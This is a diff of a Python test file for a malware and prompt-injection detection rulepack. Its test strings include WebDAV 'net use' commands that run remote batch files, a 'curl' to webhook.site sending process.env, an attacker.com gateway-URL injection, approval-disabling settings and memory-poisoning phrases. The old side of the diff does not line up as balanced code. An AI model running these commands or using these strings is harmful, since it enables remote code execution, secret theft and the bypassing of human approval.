@@ -1131,100 +1131,159 @@ def test_new_patterns_2026_03_19() -> None:
     assert mal034 is not None
     assert (
         mal034.pattern.search(
-            "code --install-extension --force malicious.vsix"
             r"net use Z: \\cloudflare.report@443\DavWWWRoot\forever\e\ && Z:\recovery.bat"
         )
         is not None
     )
     assert (
         mal034.pattern.search(
-            'case "startkeylogger":'
-        )
-        is not None
-    )
-    assert (
-        mal034.pattern.search(
-            'case "domsnapshot":'
-        )
-        is not None
-    )
-    assert (
-        mal034.pattern.search(
-            '/api/commands?agent_id=abc123'
-        )
-        is not None
-    )
-    assert (
-        mal034.pattern.search(
-            '/api/exfil'
-        )
-        is not None
-    )
-    assert (
-        mal034.pattern.search(
-            'localstoragedump'
-        )
-        is not None
-    )
-    assert (
-        mal034.pattern.search(
-            'capture_clipboard'
-        )
-        is not None
-    )
-    # Negative: normal extension install without --force
-    assert mal034.pattern.search("code --install-extension myext") is None
-    # MAL-035: OpenClaw gatewayUrl parameter injection and approval bypass
             r"net use W: \\happyglamper.ro\webdav /persistent:no && start W:\fix.cmd"
         )
         is not None
     )
+    # Negative: normal net use without WebDAV
     assert mal034.pattern.search("net use Z: /delete") is None
 
-    # MAL-035: Trojanized Electron app.asar C2 payload injection
-    mal035 = next((r for r in compiled.static_rules if r.id == "MAL-035"), None)
-    assert mal035 is not None
+    # MAL-035: OpenClaw gatewayUrl parameter injection and approval bypass
+    mal035_list = [r for r in compiled.static_rules if r.id == "MAL-035"]
+    assert len(mal035_list) >= 1
+    mal035_gw = next((r for r in mal035_list if r.pattern.search("gatewayUrl=")), None)
+    assert mal035_gw is not None
     assert (
-        mal035.pattern.search(
+        mal035_gw.pattern.search(
             "gatewayUrl=https://attacker.com"
-            "asar.extractAll('app.asar', './app'); exec('node ./app/c2-beacon.js')"
         )
         is not None
     )
     assert (
-        mal035.pattern.search(
+        mal035_gw.pattern.search(
             "gatewayUrl: https://evil.com"
         )
         is not None
     )
     assert (
-        mal035.pattern.search(
+        mal035_gw.pattern.search(
             "exec.approvals.set: off"
         )
         is not None
     )
     assert (
-        mal035.pattern.search(
+        mal035_gw.pattern.search(
             "exec.approval.set = disable"
         )
         is not None
     )
     assert (
-        mal035.pattern.search(
+        mal035_gw.pattern.search(
             "approvals.disable()"
         )
         is not None
     )
     assert (
-        mal035.pattern.search(
+        mal035_gw.pattern.search(
             "confirmation_prompts: off"
         )
         is not None
     )
     # Negative: normal gateway URL reference
-    assert mal035.pattern.search("the gateway is running on port 8080") is None
+    assert mal035_gw.pattern.search("the gateway is running on port 8080") is None
+
+    # MAL-035: Trojanized Electron app.asar C2 payload injection
+    mal035_asar = next((r for r in mal035_list if r.pattern.search("app.asar exec")), None)
+    assert mal035_asar is not None
+    assert (
+        mal035_asar.pattern.search(
             "require('asar'); exec('payload')"
         )
         is not None
     )
-    assert mal035.pattern.search("npm install electron") is None
+    assert mal035_asar.pattern.search("npm install electron") is None
+
+
+def test_new_patterns_2026_03_20() -> None:
+    """Test new patterns added from March 20, 2026 threat intelligence update."""
+    compiled = load_compiled_builtin_rulepack()
+
+    # MAL-036: AI-gated malware execution via LLM API C2 decision-making
+    mal036 = next((r for r in compiled.static_rules if r.id == "MAL-036"), None)
+    assert mal036 is not None
+    assert (
+        mal036.pattern.search("GenerateEvasionTechnique()") is not None
+    )
+    assert (
+        mal036.pattern.search("AnalyzeTargetEnvironment()") is not None
+    )
+    assert (
+        mal036.pattern.search("GenerateObfuscatedCommunication()") is not None
+    )
+    assert (
+        mal036.pattern.search("SendToC2ServerWithLLM()") is not None
+    )
+    assert (
+        mal036.pattern.search("ai-powered stealth payload started") is not None
+    )
+    assert (
+        mal036.pattern.search("X-LLM-Enhanced: true") is not None
+    )
+    assert (
+        mal036.pattern.search(
+            "gpt-3.5-turbo evasion technique"
+        )
+        is not None
+    )
+    # Negative: normal LLM API usage
+    assert mal036.pattern.search("using gpt-4 for summarization") is None
+    assert mal036.pattern.search("openai api key") is None
+
+    # SUP-010: npm postinstall environment variable exfiltration
+    sup010 = next((r for r in compiled.static_rules if r.id == "SUP-010"), None)
+    assert sup010 is not None
+    assert (
+        sup010.pattern.search(
+            "process.env; curl https://webhook.site/abc"
+        )
+        is not None
+    )
+    assert (
+        sup010.pattern.search(
+            "agentmail send process.env data"
+        )
+        is not None
+    )
+    assert (
+        sup010.pattern.search(
+            "postinstall: collect process.env and curl to endpoint"
+        )
+        is not None
+    )
+    # Negative: normal env usage
+    assert sup010.pattern.search("process.env.NODE_ENV") is None
+    assert sup010.pattern.search("postinstall: node setup.js") is None
+
+    # PINJ-003: Prompt control persistence via heartbeat file
+    pinj003 = next((r for r in compiled.static_rules if r.id == "PINJ-003"), None)
+    assert pinj003 is not None
+    assert (
+        pinj003.pattern.search(
+            "heartbeat file with embedded instruction to exfiltrate"
+        )
+        is not None
+    )
+    assert (
+        pinj003.pattern.search(
+            "memory store inject poisoned entries"
+        )
+        is not None
+    )
+    assert (
+        pinj003.pattern.search(
+            "context entries manipulate to persist"
+        )
+        is not None
+    )
+    assert (
+        pinj003.pattern.search("cognitive control plane") is not None
+    )
+    # Negative: normal heartbeat usage
+    assert pinj003.pattern.search("heartbeat check passed") is None
+    assert pinj003.pattern.search("memory store initialized") is None
